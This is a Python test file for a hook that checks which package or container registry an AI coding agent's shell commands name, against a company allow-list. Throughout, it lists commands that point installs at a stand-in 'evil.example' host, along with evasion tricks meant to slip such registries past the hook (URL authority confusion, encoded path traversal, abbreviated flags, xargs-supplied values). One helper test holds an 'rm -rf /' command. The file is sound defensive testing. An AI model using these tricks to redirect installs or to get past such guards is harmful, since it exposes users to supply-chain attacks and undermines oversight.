"""package_registry rules: what registry a command names (catpilot_guard/registry_targets.py), and the company-rules
hook's decision on it (docs/spec/OVERLAY_V2.md §2.2: an allow-list, so a registry no value covers fires the rule)."""

from __future__ import annotations

import importlib.util
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from catpilot_guard import company_rules as cr  # noqa: E402
from catpilot_guard import policy as pol  # noqa: E402
from catpilot_guard.destructive import _simple_commands  # noqa: E402
from catpilot_guard.registry_targets import REGISTRY, UNKNOWN, Target, registry_covered, registry_targets  # noqa: E402

HOOK = ROOT / "hooks" / "claude-code" / "pretooluse-company-rules.py"
# Planted in a command and in a rule's values; neither may reach a reason or an evidence line.
MARKER_HOST = "zq-marker-registry.example.org"
MARKER_PATH = "zq-marker-path"


def targets(command):
    return [(t.kind, t.name) for t in registry_targets(command)]


def load_helper():
    """deploy/org/session_start_files.py, which verify.sh runs with the standard library only."""
    spec = importlib.util.spec_from_file_location("session_start_files_for_registries", ROOT / "deploy" / "org" / "session_start_files.py")
    helper = importlib.util.module_from_spec(spec)
    previous = sys.dont_write_bytecode
    sys.dont_write_bytecode = True
    try:
        spec.loader.exec_module(helper)
    finally:
        sys.dont_write_bytecode = previous
    return helper


class RegistryTargetTests(unittest.TestCase):
    def test_commands_that_name_a_registry(self):
        cases = {
            # npm, pnpm, yarn, bun and their runners: --registry anywhere.
            "npm install --registry https://registry.npmjs.org/ left-pad": "registry.npmjs.org",
            "npm i --registry=https://NPM.Example.org/team/ a": "npm.example.org/team",
            "npm ci --registry https://npm.example.org": "npm.example.org",
            "npm publish --registry https://npm.example.org/": "npm.example.org",
            "npm login --registry=https://npm.example.org": "npm.example.org",
            "npm --registry https://npm.example.org install": "npm.example.org",
            "npm install --@acme:registry=https://npm.example.org/acme": "npm.example.org/acme",
            "pnpm add left-pad --registry https://npm.example.org": "npm.example.org",
            "yarn add left-pad --registry https://npm.example.org": "npm.example.org",
            "bun add left-pad --registry https://npm.example.org": "npm.example.org",
            "npx --registry https://npm.example.org create-app x": "npm.example.org",
            "pnpm dlx --registry https://npm.example.org create-app": "npm.example.org",
            # Registry settings.
            "npm config set registry https://npm.example.org/": "npm.example.org",
            "npm config set registry=https://npm.example.org/": "npm.example.org",
            "npm set registry https://npm.example.org": "npm.example.org",
            "npm config set @acme:registry https://npm.example.org/acme/": "npm.example.org/acme",
            "pnpm config set registry https://npm.example.org": "npm.example.org",
            "yarn config set registry https://npm.example.org": "npm.example.org",
            "yarn config set npmRegistryServer https://npm.example.org": "npm.example.org",
            "yarn config set npmPublishRegistry https://npm.example.org/publish": "npm.example.org/publish",
            "yarn config set npmScopes.acme.npmRegistryServer https://npm.example.org/acme": "npm.example.org/acme",
            "npx pnpm config set registry https://npm.example.org": "npm.example.org",
            # pip and uv.
            "pip install -i https://pypi.example.org/simple requests": "pypi.example.org/simple",
            "pip install --index-url=https://pypi.example.org/simple/ requests": "pypi.example.org/simple",
            "pip install -ihttps://pypi.example.org/simple requests": "pypi.example.org/simple",
            "pip3 install --extra-index-url https://extra.example.org/simple x": "extra.example.org/simple",
            "pip3.12 download -f https://wheels.example.org/ x": "wheels.example.org",
            "pip wheel --find-links=https://wheels.example.org/w x": "wheels.example.org/w",
            "python3 -m pip install -i https://pypi.example.org/simple x": "pypi.example.org/simple",
            "python3.11 -I -m pip install -i https://pypi.example.org/simple x": "pypi.example.org/simple",
            "poetry run pip install -i https://pypi.example.org/simple x": "pypi.example.org/simple",
            "pip install --index-url https://__token__:${TOKEN}@pypi.example.org/simple x": "pypi.example.org/simple",
            "pip install -i https://user:pw@pypi.example.org:8443/simple?x=1#f x": "pypi.example.org/simple",
            "pip install -i https://pypi.example.org/a/./b/../simple// x": "pypi.example.org/a/simple",
            "pip install -i pypi.example.org/simple x": "pypi.example.org/simple",  # no scheme: read as https
            "pip config set global.index-url https://pypi.example.org/simple": "pypi.example.org/simple",
            "pip config --user set install.find-links https://wheels.example.org": "wheels.example.org",
            "uv pip install --index-url https://pypi.example.org/simple x": "pypi.example.org/simple",
            "uv pip install --default-index https://pypi.example.org/simple x": "pypi.example.org/simple",
            "uv add x --index internal=https://pypi.example.org/simple": "pypi.example.org/simple",
            "uv lock --index https://pypi.example.org/simple": "pypi.example.org/simple",
            # Poetry, twine, gem, go.
            "poetry source add internal https://pypi.example.org/simple": "pypi.example.org/simple",
            "poetry source add --priority=supplemental internal https://pypi.example.org/simple": "pypi.example.org/simple",
            "poetry config repositories.internal https://upload.example.org/legacy": "upload.example.org/legacy",
            "twine upload --repository-url https://upload.example.org/legacy/ dist/*": "upload.example.org/legacy",
            "twine upload --repository-url=https://upload.example.org/legacy dist/*": "upload.example.org/legacy",
            "gem install rails --source https://gems.example.org": "gems.example.org",
            "gem install rails -s https://gems.example.org": "gems.example.org",
            "gem sources --add https://gems.example.org/": "gems.example.org",
            "gem push x.gem --host https://gems.example.org": "gems.example.org",
            "bundle exec gem push x.gem --host=https://gems.example.org": "gems.example.org",
            "go env -w GOPROXY=https://proxy.example.org,direct": "proxy.example.org",
            # Containers: an explicit registry only.
            "docker push ghcr.io/acme/app:1.2": "ghcr.io/acme/app",
            "docker pull registry.example.org:5000/team/app@sha256:abc": "registry.example.org/team/app",
            "docker pull docker.io/library/ubuntu": "docker.io/library/ubuntu",
            "docker --context remote push GHCR.io/Acme/App": "ghcr.io/acme/app",
            "docker image push ghcr.io/acme/app": "ghcr.io/acme/app",
            "docker pull --platform linux/amd64 ghcr.io/acme/app": "ghcr.io/acme/app",
            "podman push app docker://quay.io/acme/app": "quay.io/acme/app",
            "docker login ghcr.io": "ghcr.io",
            "docker login -u me --password-stdin registry.example.org:5000": "registry.example.org",
            "docker login https://index.docker.io/v1/": "index.docker.io/v1",
            # Assignments, read before the split drops them.
            "NPM_CONFIG_REGISTRY=https://npm.example.org npm ci": "npm.example.org",
            "npm_config_registry=https://npm.example.org npm ci": "npm.example.org",
            "env YARN_NPM_REGISTRY_SERVER=https://npm.example.org yarn install": "npm.example.org",
            "export PIP_INDEX_URL=https://pypi.example.org/simple": "pypi.example.org/simple",
            "PIP_INDEX_URL=https://pypi.example.org/simple": "pypi.example.org/simple",
            "UV_INDEX=internal=https://pypi.example.org/simple uv sync": "pypi.example.org/simple",
            "POETRY_REPOSITORIES_INTERNAL_URL=https://upload.example.org/legacy poetry publish -r internal": "upload.example.org/legacy",
            "TWINE_REPOSITORY_URL=https://upload.example.org/legacy twine upload dist/*": "upload.example.org/legacy",
            "RUBYGEMS_HOST=https://gems.example.org gem push x.gem": "gems.example.org",
            "GOPROXY=https://proxy.example.org go mod download": "proxy.example.org",
            # Through the same splitting and wrappers as the other checks.
            "sudo -E npm install --registry https://npm.example.org": "npm.example.org",
            "cd web && npm ci --registry https://npm.example.org": "npm.example.org",
            "bash -lc 'pip install -i https://pypi.example.org/simple x'": "pypi.example.org/simple",
            "timeout 60 docker push ghcr.io/acme/app": "ghcr.io/acme/app",
            "npx -c 'npm install --registry https://npm.example.org'": "npm.example.org",
            "echo ok\nnpm publish --registry https://npm.example.org": "npm.example.org",
        }
        for command, name in cases.items():
            with self.subTest(command=command):
                self.assertEqual(targets(command), [(REGISTRY, name)])

    def test_several_registries_in_one_command(self):
        self.assertEqual(targets("pip install -i https://a.example.org/simple --extra-index-url https://b.example.org/simple x"),
                         [(REGISTRY, "a.example.org/simple"), (REGISTRY, "b.example.org/simple")])
        self.assertEqual(targets("PIP_EXTRA_INDEX_URL='https://a.example.org/s https://b.example.org/s' pip install x"),
                         [(REGISTRY, "a.example.org/s"), (REGISTRY, "b.example.org/s")])
        self.assertEqual(targets("GOPROXY='https://a.example.org|https://b.example.org,off' go build"),
                         [(REGISTRY, "a.example.org"), (REGISTRY, "b.example.org")])
        self.assertEqual(targets("docker pull ghcr.io/a/b && docker push registry.example.org/a/b"),
                         [(REGISTRY, "ghcr.io/a/b"), (REGISTRY, "registry.example.org/a/b")])

    def test_registries_the_hook_cannot_read_are_unknown(self):
        for command in ("npm install --registry $REGISTRY", "yarn add x --registry ${NPM_REGISTRY}", "pip install -i $INDEX x",
                        "pip install -f $WHEELS x", "pip install -i https://$HOST/simple x", "docker push $IMAGE",
                        "docker push ${REGISTRY}/app:1", "docker push localhost:5000/app", "docker pull 10.0.0.5:5000/app",
                        "docker pull [::1]:5000/app", "docker login localhost:5000", "NPM_CONFIG_REGISTRY=$R npm ci",
                        "pip install -i https://10.0.0.5/simple x", "npm install --registry https://localhost:4873"):
            with self.subTest(command=command):
                self.assertEqual(targets(command), [(UNKNOWN, None)])

    def test_a_variable_in_a_url_path_leaves_the_host_and_ends_an_image_path(self):
        # $T may hold `../..`, which reaches any path on the host: only a value with no path covers it. An image path
        # cannot hold `..`, so there the path ends before the variable.
        self.assertEqual(targets("pip install -i https://pypi.example.org/team/$T/simple x"), [(REGISTRY, "pypi.example.org")])
        self.assertEqual(targets("docker push ghcr.io/$ORG/app"), [(REGISTRY, "ghcr.io")])
        self.assertEqual(targets("docker push ghcr.io/acme/$APP:1"), [(REGISTRY, "ghcr.io/acme")])

    def test_a_backslash_or_a_stray_character_in_the_authority_is_unknown(self):
        # Node's URL parser (npm, uv) and urllib3 (pip, twine, poetry) end the authority at a backslash, so the first
        # command connects to evil.example; Python's urllib.parse does not. Neither host is read: unknown.
        for command in ("npm install --registry 'https://evil.example\\@registry.npmjs.org/' x",
                        "npm install --registry 'https://registry.npmjs.org\\@evil.example/' x",
                        "pip install -i 'https://evil.example\\@pypi.org/simple' x",
                        "npm install --registry 'evil.example\\@registry.npmjs.org' x",
                        "npm install --registry 'https://reg istry.npmjs.org/' x",
                        "npm install --registry 'https://registry.npmjs.org\"@evil.example/' x",
                        "npm install --registry 'https://registry.npmjs.org^@evil.example/' x",
                        # A WHATWG parser reads a host from these too.
                        "npm install --registry https:evil.example x", "npm install --registry 'https:/\\evil.example' x",
                        "npm install --registry 'https:\\\\evil.example' x", "npm install --registry https:///evil.example x",
                        # A last label a WHATWG parser reads as a number: an IPv4 address.
                        "npm install --registry https://1.2.3.0x4/ x", "npm install --registry https://evil.0x7f/ x"):
            with self.subTest(command=command):
                self.assertEqual(targets(command), [(UNKNOWN, None)])
        # Credentials, variables in them included, are still skipped.
        self.assertEqual(targets("npm install --registry 'https://u:p%40ss@npm.example.org/' x"), [(REGISTRY, "npm.example.org")])

    def test_an_escaped_or_unreadable_path_segment_leaves_only_the_host(self):
        # npm normalized /api/npm/npm-approved/%2e%2e/npm-remote-all/ to /api/npm/npm-remote-all/.
        for segment in ("%2e%2e", ".%2e", "%2E%2E", "%2e.", "..\\npm-remote-all", "..;", "$UP", "${UP}", "`echo ..`"):
            command = "npm install --registry 'https://artifactory.example.com/api/npm/npm-approved/%s/npm-remote-all/' x" % segment
            with self.subTest(command=command):
                self.assertEqual(targets(command), [(REGISTRY, "artifactory.example.com")])
        # A literal .. is applied, as the parsers apply it.
        self.assertEqual(targets("npm install --registry https://artifactory.example.com/api/npm/npm-approved/../npm-remote-all/ x"),
                         [(REGISTRY, "artifactory.example.com/api/npm/npm-remote-all")])

    def test_abbreviated_long_options_and_short_clusters(self):
        url = "https://evil.example/simple"
        for command in (
                # pip (optparse) takes any unique prefix of a long option, and i or f at the end of a cluster of flags.
                "pip install --index %s x", "pip install --in %s x", "pip install --ind=%s x", "pip install --extra %s x",
                "pip wheel --ext=%s x", "pip install --find %s x", "pip download --f %s x", "pip install -vi %s x",
                "pip install -Ui %s x", "pip install -qi %s x", "pip install -qvU -i %s x", "pip lock -i %s",
                # Python's own options: -mMODULE, and -m clustered with other flags.
                "python -mpip install -i %s x", "python -Im pip install -i %s x", "python3 -W ignore -m pip install -i %s x",
                "python3 -X importtime -Bm pip install -i %s x", "py -3.12 -m pip install -i %s x",
                "python3 -m pip.__main__ install -i %s x",
                # A general pip option this module does not know, before the subcommand.
                "pip --cache-d /tmp install -i %s x",
                # npm (nopt): an abbreviation of --registry down to --reg, and the -reg shorthand.
                "npm --reg=%s install x", "npm install --regis %s x", "npm install -reg %s x", "pnpm add x --reg %s",
                "npm c set registry %s", "npm conf set registry=%s",
                # twine (argparse), gem (Ruby's OptionParser).
                "twine upload --repository-u %s dist/*", "gem install x --so %s", "gem push x.gem --ho=%s",
                "gem sources --ad %s", "gem install x -Vs %s"):
            command = command % url
            with self.subTest(command=command):
                self.assertEqual(len(targets(command)), 1)
                self.assertEqual(targets(command)[0][0], REGISTRY)
                self.assertTrue(targets(command)[0][1].startswith("evil.example"))
        self.assertEqual(targets("pip install -qihttps://evil.example/simple x"), [(REGISTRY, "evil.example/simple")])
        self.assertEqual(targets("npm --reg https://ok.example config set registry https://evil.example"),
                         [(REGISTRY, "ok.example"), (REGISTRY, "evil.example")])
        # Not these: another option's value in the cluster, uv's exact names (`--extra` is uv's extras option),
        # twine's --repository NAME, a script's own options, and an option that only shares a prefix.
        for command in ("pip install -Ur req.txt x", "pip install -ri x", "uv sync --extra dev", "uv add x --extra cli",
                        "twine upload --repository internal dist/*", "python3 script.py -i https://evil.example/simple",
                        "python -c 'import pip' -i https://evil.example/simple", "npm install --regex x",
                        "pip install --editable . --exists-action w"):
            with self.subTest(command=command):
                self.assertEqual(targets(command), [])

    def test_more_uv_commands_and_container_runs(self):
        url = "https://evil.example/simple"
        for command in ("uvx --index %s ruff", "uvx --index-url %s ruff@0.6", "uvx -i %s ruff", "uv tool install --index %s ruff",
                        "uv tool run --index %s ruff", "uv tool upgrade --default-index %s ruff",
                        "uv run --index %s --with x script.py", "uv run --extra-index-url=%s pytest", "uv venv --index-url %s",
                        "uv export --index-url %s", "uv build --find-links %s", "uv remove x --index %s",
                        "uv pip list --outdated --index-url %s", "uv publish --publish-url %s", "uv publish --check-url=%s",
                        "UV_PUBLISH_URL=%s uv publish", "UV_PUBLISH_CHECK_URL=%s uv publish",
                        "UV_DEFAULT_INDEX=internal=%s uv lock"):
            command = command % url
            with self.subTest(command=command):
                self.assertEqual(targets(command), [(REGISTRY, "evil.example/simple")])
        # docker and podman run and create pull a missing image.
        for command in ("docker run ghcr.io/evil/app", "docker run --rm -it -e A=b -v /x:/y --name n ghcr.io/evil/app sh",
                        "docker run -dp 8080:80 ghcr.io/evil/app", "docker create --platform linux/amd64 ghcr.io/evil/app:1",
                        "docker container run -d ghcr.io/evil/app", "docker container create ghcr.io/evil/app",
                        "podman run --pull=always ghcr.io/evil/app", "podman create --authfile a.json ghcr.io/evil/app",
                        "docker --context remote run -- ghcr.io/evil/app"):
            with self.subTest(command=command):
                self.assertEqual(targets(command), [(REGISTRY, "ghcr.io/evil/app")])
        # An option this module does not know: both readings, the flag one naming the image.
        self.assertIn((REGISTRY, "ghcr.io/evil/app"), targets("podman run --new-flag ghcr.io/evil/app"))
        self.assertIn((REGISTRY, "ghcr.io/evil/app"), targets("podman run --new-option value ghcr.io/evil/app"))
        # Each (position, readings left) is walked once: thousands of unknown options stay linear, not cubic.
        # Past three such options the image may be elsewhere, so the command is also unknown.
        self.assertEqual(targets("podman run " + "--zz " * 5000 + "ghcr.io/evil/app"), [(REGISTRY, "ghcr.io/evil/app"), (UNKNOWN, None)])
        for command in ("uv publish --index internal", "uv publish", "uv python install -i pydir 3.12", "uv init --name x",
                        "docker run --rm alpine echo ghcr.io/x/y", "docker run ubuntu", "docker run --help",
                        "docker container ls", "podman run --rootfs /srv/root sh"):
            with self.subTest(command=command):
                self.assertEqual(targets(command), [])

    def test_runners_are_looked_through_past_their_own_options(self):
        url = "https://evil.example/simple"
        for command in ("uv run --no-project pip install -i %s x", "uv run -- pip install -i %s x",
                        "uv --directory d run pip install -i %s x", "uv run --with requests pip install -i %s x",
                        "uv run -p 3.12 python -m pip install -i %s x", "uv run --new-flag pip install -i %s x",
                        "poetry -C dir run pip install -i %s x", "poetry run -- pip install -i %s x",
                        "pipenv run python -m pip install -i %s x", "uvx --from 'pip==24' pip install -i %s x",
                        "bundle exec pip install -i %s x"):
            command = command % url
            with self.subTest(command=command):
                self.assertEqual(targets(command), [(REGISTRY, "evil.example/simple")])
        self.assertEqual(targets("uv run --index https://a.example.org/simple pip install -i https://b.example.org/simple x"),
                         [(REGISTRY, "a.example.org/simple"), (REGISTRY, "b.example.org/simple")])

    def test_pip_config_keys_in_any_case_and_with_underscores(self):
        for key in ("global.index_url", "global.INDEX-URL", "install.Index_Url", "global.extra_index_url", "global.extra-index_url"):
            with self.subTest(key=key):
                self.assertEqual(targets("pip config set %s https://evil.example/simple" % key), [(REGISTRY, "evil.example/simple")])
        self.assertEqual(targets("pip config set install.find_links https://evil.example/w"), [(REGISTRY, "evil.example/w")])
        self.assertEqual(targets("pip config set install.find_links ./wheels"), [])

    def test_a_value_option_left_last_is_unknown(self):
        # xargs or stdin supplies the value, which the hook cannot read.
        for command in ("echo https://evil.example | xargs npm install --registry", "echo u | xargs npm install x --reg",
                        "echo u | xargs pip install -i", "echo u | xargs pip install x --index-url",
                        "echo u | xargs uv pip install x --index", "echo u | xargs uvx --index",
                        "echo u | xargs twine upload dist/* --repository-url", "echo u | xargs gem install x --source",
                        "echo u | xargs npm config set registry", "echo u | xargs pip config set global.index-url",
                        "echo u | xargs poetry source add internal", "echo u | xargs uv publish --publish-url",
                        "echo ghcr.io/x/y | xargs docker push", "echo ghcr.io/x/y | xargs docker pull",
                        "echo ghcr.io/x/y | xargs docker run"):
            with self.subTest(command=command):
                self.assertEqual(targets(command), [(UNKNOWN, None)])
        self.assertEqual(targets("poetry source add pypi"), [])  # PyPI needs no URL

    def test_a_heredoc_line_that_reads_as_an_assignment_counts(self):
        # The docs say so: such a line is read as an assignment, so writing it into a file this way fires the rule.
        self.assertEqual(targets("cat > .env <<'EOF'\nPIP_INDEX_URL=https://evil.example/simple\nEOF"),
                         [(REGISTRY, "evil.example/simple")])
        self.assertEqual(targets("echo 'PIP_INDEX_URL=https://evil.example/simple' > .env"), [])

    # Second review of PR #135 (564d238).

    def test_pips_hidden_pypi_url_alias(self):
        url = "https://evil.example/simple"
        for command in ("pip install --pypi-url %s x", "pip install --pyp %s x", "pip install --pypi=%s x",
                        "python -m pip download --pypi-url=%s x", "PIP_PYPI_URL=%s pip install x",
                        "export PIP_PYPI_URL=%s", "pip config set global.pypi-url %s", "pip config set install.PYPI_URL %s"):
            command = command % url
            with self.subTest(command=command):
                self.assertEqual(targets(command), [(REGISTRY, "evil.example/simple")])
        # --py is ambiguous in pip (--python, --python-version), and --python is its own option.
        for command in ("pip install --python /usr/bin/python3 x", "pip install --python-version 3.12 --target t x"):
            with self.subTest(command=command):
                self.assertEqual(targets(command), [])

    def test_npm_options_with_any_number_of_leading_dashes(self):
        # nopt strips the dashes: npm reads each of these as --registry or --@acme:registry.
        for command in ("npm install -registry https://evil.example/ left-pad", "npm install -regi https://evil.example/ left-pad",
                        "npm install -regis=https://evil.example/ left-pad", "npm install ---registry https://evil.example/ left-pad",
                        "npm install ---reg=https://evil.example/ left-pad", "npm install -@acme:registry=https://evil.example/ @acme/x",
                        "npx -registry https://evil.example/ cowsay", "pnpm install -registry https://evil.example/",
                        "npm install --reg https://evil.example/ left-pad", "npm install -reg https://evil.example/ left-pad",
                        "npm --registry=https://evil.example/ config set fund false"):
            with self.subTest(command=command):
                self.assertEqual(targets(command), [(REGISTRY, "evil.example")])
        for command in ("npm install -r x", "npm install --re x", "npm run build -- --registry-like", "npm run -registry-like",
                        "npm install -g x"):
            with self.subTest(command=command):
                self.assertEqual(targets(command), [])

    def test_tabs_and_newlines_inside_a_url_are_removed_first(self):
        # A WHATWG parser (npm, uv) removes them anywhere in the URL: `.<TAB>.` is `..` (npm fetched /x/left-pad).
        for command in ("NPM_CONFIG_REGISTRY='https://registry.example.org/simple/.\t./x' npm install left-pad",
                        "uv pip install -i 'https://registry.example.org/simple/.\t./x' left-pad",
                        "npm install --registry 'https://registry.example.org/simple/.\n./x' left-pad",
                        "npm install --registry 'https://registry.example.org/simple/.\r./x' left-pad"):
            with self.subTest(command=command):
                self.assertEqual(targets(command), [(REGISTRY, "registry.example.org/x")])
        self.assertEqual(targets("npm install --registry 'https://registry.example.org/sim\tple' x"),
                         [(REGISTRY, "registry.example.org/simple")])
        # Any other control character in a segment leaves the host alone.
        self.assertEqual(targets("npm install --registry 'https://registry.example.org/simple/.\x0b./x' y"),
                         [(REGISTRY, "registry.example.org")])
        # A list split on whitespace by pip and on spaces by uv: both readings.
        self.assertEqual(targets("UV_EXTRA_INDEX_URL='https://registry.example.org/simple/.\t./x' uv sync"),
                         [(REGISTRY, "registry.example.org/simple"), (REGISTRY, "registry.example.org/x")])

    def test_percent_escapes_are_decoded_unless_they_could_escape(self):
        cases = {
            "https://registry.example.org/simple/My%20Project/x": "registry.example.org/simple/my project/x",
            "https://registry.example.org/%41pi/simple": "registry.example.org/api/simple",
            # These may be read as `..`, a separator or another escape: only the host remains.
            "https://registry.example.org/simple/%2e%2e/x": "registry.example.org",
            "https://registry.example.org/simple/%2e/x": "registry.example.org",
            "https://registry.example.org/simple/%252e%252e/x": "registry.example.org",
            "https://registry.example.org/simple/a%2fb": "registry.example.org",
            "https://registry.example.org/simple/a%5cb": "registry.example.org",
            "https://registry.example.org/simple/a%3bb": "registry.example.org",
            "https://registry.example.org/simple/a%00b": "registry.example.org",
        }
        for url, name in cases.items():
            with self.subTest(url=url):
                self.assertEqual(targets("pip install -i '%s' x" % url), [(REGISTRY, name)])

    def test_pip_config_with_its_own_options_before_set(self):
        for options in ("--timeout 30", "--log /tmp/l", "--proxy http://p:1", "--cert c.pem", "--cache-dir /tmp/c",
                        "--ed vim", "--editor=vim", "--user", "--global --timeout=3"):
            command = "pip config %s set global.index-url https://evil.example/simple" % options
            with self.subTest(command=command):
                self.assertEqual(targets(command), [(REGISTRY, "evil.example/simple")])
        self.assertEqual(targets("pip config set global.index-url https://evil.example/simple --user"),
                         [(REGISTRY, "evil.example/simple")])
        self.assertEqual(targets("pip config --timeout 30 set global.index-url"), [(UNKNOWN, None)])
        self.assertEqual(targets("pip config --timeout 30 get global.index-url"), [])

    def test_npm_config_keys_anywhere_after_set(self):
        for command in ("npm config set -L user registry https://evil.example/", "npm config set --location user registry https://evil.example/",
                        "npm config --location=user set registry https://evil.example/",
                        "npm config set fund false registry https://evil.example/", "npm config set fund=false registry=https://evil.example/"):
            with self.subTest(command=command):
                self.assertEqual(targets(command), [(REGISTRY, "evil.example")])

    def test_an_unquoted_command_substitution_in_docker_run_is_unknown(self):
        # Known limit, pinned so that fixing it is deliberate: destructive._tokens cuts the command at an unquoted `$(`,
        # so the run has no image and is unknown, which fires the rule. When the splitter reads command substitutions,
        # these name Docker Hub images (no registry) and should give [] like the quoted form below.
        for command in ("docker run --rm -it -v $(pwd):/app -w /app node:20 npm install",
                        "docker run --rm -u $(id -u):$(id -g) -v \"$PWD\":/w python:3.12 python -V",
                        "podman run --rm -v $(pwd):/w:Z fedora:40 ls"):
            with self.subTest(command=command):
                self.assertEqual(targets(command), [(UNKNOWN, None)])
        self.assertEqual(targets('docker run --rm -it -v "$(pwd)":/app -w /app node:20 npm install'), [])

    def test_runner_options_after_one_the_reader_does_not_know(self):
        url = "https://evil.example/simple"
        for command in ("uvx --no-build-isolation-package foo --index-url %s ruff",
                        "uv run --no-build-isolation-package foo --index-url %s python x.py",
                        "uvx --new-option foo --index-url %s ruff", "uv run --new-option foo --index %s python x.py",
                        "uv run -w requests python -m pip install -i %s x"):
            command = command % url
            with self.subTest(command=command):
                self.assertIn((REGISTRY, "evil.example/simple"), targets(command))
        # Past three such options the command may start anywhere: unknown, and the readings that were made.
        self.assertIn((UNKNOWN, None), targets("uv run --a 1 --b 2 --c 3 --d 4 pip install x"))
        self.assertNotIn((UNKNOWN, None), targets("uv run --a 1 --b 2 --c 3 pip install x"))

    def test_more_container_global_options_and_windows_names(self):
        for command in ("podman --db-backend sqlite pull evil.example/x:1", "podman --runtime-flag x pull evil.example/x:1",
                        "podman --cdi-spec-dir d pull evil.example/x:1", "podman --out f pull evil.example/x:1",
                        "docker --new-global-option v pull evil.example/x:1", "docker.exe pull evil.example/x:1"):
            with self.subTest(command=command):
                self.assertEqual(targets(command), [(REGISTRY, "evil.example/x")])
        for command in ("pip.exe install -i https://evil.example/simple x", "python.exe -m pip install -i https://evil.example/simple x",
                        "gem --config-file x install y -s https://evil.example/simple"):
            with self.subTest(command=command):
                self.assertEqual(targets(command), [(REGISTRY, "evil.example/simple")])

    def test_env_passes_on_names_the_shell_refuses(self):
        # env takes every NAME=VALUE before the command; npm reads npm_config_@scope:registry from it.
        self.assertEqual(targets("env 'npm_config_@acme:registry=https://evil.example/' npm install @acme/x"), [(REGISTRY, "evil.example")])
        self.assertEqual(targets("env 'A-B=x/y' npm install --registry https://evil.example/ x"), [(REGISTRY, "evil.example")])
        seen: list = []
        self.assertEqual(list(_simple_commands("env 'A-B=x/y' rm -rf /", assignments=seen)), [["rm", "-rf", "/"]])
        self.assertEqual(seen, ["A-B=x/y"])

    def test_a_network_path_reference_is_unknown_where_only_a_url_is_taken(self):
        self.assertEqual(targets("npm install --registry //evil.example/simple x"), [(UNKNOWN, None)])
        self.assertEqual(targets("pip install -f //server/wheels x"), [])  # find-links: a path

    def test_no_deprecation_warning(self):
        # re.split's maxsplit passed by position warns on Python 3.13+.
        import warnings
        with warnings.catch_warnings():
            warnings.simplefilter("error", DeprecationWarning)
            self.assertEqual(targets("pip install -i https://pypi.example.org/simple?x#y x"), [(REGISTRY, "pypi.example.org/simple")])

    def test_commands_that_name_no_registry(self):
        for command in ("npm install", "npm ci", "npm publish", "pnpm add left-pad", "yarn", "npx create-react-app x",
                        "pip install requests", "pip install -r requirements.txt", "python -m pip install -U pip",
                        "pip install -f ./wheels x", "pip install -f /opt/wheels x", "pip install -f $HOME/wheels x",
                        "pip install -i file:///srv/simple x", "pip list --index-url https://pypi.example.org/simple",
                        "uv sync", "uv run pytest -f x", "poetry publish -r internal", "poetry source add pypi",
                        "twine upload dist/*", "twine upload -r internal dist/*", "gem install rails", "go mod download",
                        "GOPROXY=direct go build", "GOPROXY=off go build", "docker pull ubuntu", "docker pull library/ubuntu:22.04",
                        "docker push myorg/app:1", "docker push myorg/$APP", "docker login", "docker login -u me",
                        "docker logout ghcr.io", "docker tag app ghcr.io/acme/app", "docker build -t ghcr.io/acme/app .",
                        "podman push app oci-archive:/tmp/app.tar", "npm config get registry", "npm config set fund false",
                        "aws s3 ls", "echo --registry https://npm.example.org", "curl https://pypi.example.org/simple/",
                        "npm install https://npm.example.org/pkg.tgz", "pip install https://pypi.example.org/pkg.whl",
                        "FOO=bar npm install", "export PATH=$PATH:/x", "ls"):
            with self.subTest(command=command):
                self.assertEqual(targets(command), [])

    def test_coverage(self):
        registry = lambda name: Target(REGISTRY, name)  # noqa: E731
        cases = [
            ("npm.example.org", registry("npm.example.org"), True),
            ("npm.example.org", registry("npm.example.org/any/path"), True),
            ("npm.example.org", registry("x.npm.example.org"), False),
            ("npm.example.org", registry("npm.example.org.evil.example.net"), False),
            ("pypi.example.org/simple", registry("pypi.example.org/simple"), True),
            ("pypi.example.org/simple", registry("pypi.example.org/simple/x"), True),
            ("pypi.example.org/simple/", registry("pypi.example.org/simple"), True),
            ("pypi.example.org/simple", registry("pypi.example.org/simple2"), False),
            ("pypi.example.org/simple", registry("pypi.example.org"), False),
            ("pypi.example.org/Simple", registry("pypi.example.org/simple"), True),
            ("pypi.example.org/a//b", registry("pypi.example.org/a/b/c"), True),
            ("*.example.org", registry("npm.example.org"), True),
            ("*.example.org", registry("a.b.example.org/x"), True),
            ("*.example.org", registry("example.org"), False),
            ("*.example.org/team", registry("ghcr.example.org/team/app"), True),
            ("*.example.org/team", registry("ghcr.example.org/other"), False),
            ("ghcr.io/acme", registry("ghcr.io"), False),
            ("ghcr.io", registry("ghcr.io/acme/app"), True),
            ("npm.example.org", Target(UNKNOWN), False),
            ("*.example.org", Target(UNKNOWN), False),
        ]
        for value, target, want in cases:
            with self.subTest(value=value, target=target):
                self.assertIs(registry_covered(value, target), want)

    def test_the_split_reads_assignments_without_changing_the_commands(self):
        # destructive._simple_commands collects the assignments it drops only when asked, and yields the same commands.
        for command in ("A=1 B=2 npm ci", "env -i C=3 npm ci", "D=4", "sudo E=5 npm ci", "bash -c 'F=6 npm ci' && G=7 ls",
                        "npm ci; H=8 env I=9 pip install x", "git push --force origin main"):
            with self.subTest(command=command):
                seen: list = []
                self.assertEqual(list(_simple_commands(command, assignments=seen)), list(_simple_commands(command)))
        seen = []
        list(_simple_commands("A=1 B=2 npm ci; env C=3 ls; bash -c 'D=4 pip'; E=5", assignments=seen))
        self.assertEqual(seen, ["A=1", "B=2", "C=3", "D=4", "E=5"])


def policy(values=("npm.example.org", "pypi.example.org/simple"), mode="block", use_instead=None, extra=(), expires="2099-01-01"):
    rule = {"id": "package-registries", "kind": "package_registry", "mode": mode, "values": list(values)}
    if use_instead:
        rule["use_instead_text"] = use_instead
    return pol.parse(json.dumps({
        "format": "catpilot-company-policy", "format_version": 1, "source_sha256": "c" * 64, "expires_on": expires,
        "rules": [rule, *extra],
    }).encode())


def bash(command, permission_mode="default"):
    return {"session_id": "s1", "tool_name": "Bash", "tool_input": {"command": command}, "cwd": "/tmp", "permission_mode": permission_mode}


class HookDecisionTests(unittest.TestCase):
    def setUp(self):
        self.lines = []
        patcher = mock.patch.object(cr, "record_evidence", lambda event, hook_event=None, host=None, **f: self.lines.append((event, f)))
        patcher.start()
        self.addCleanup(patcher.stop)

    def effect(self, command, host="claude-code", ask=False, permission_mode="default", **kw):
        result = cr.decide(bash(command, permission_mode), host, policy(**kw), ask_enabled=ask)
        return result.get("hookSpecificOutput", {}).get("permissionDecision", "none")

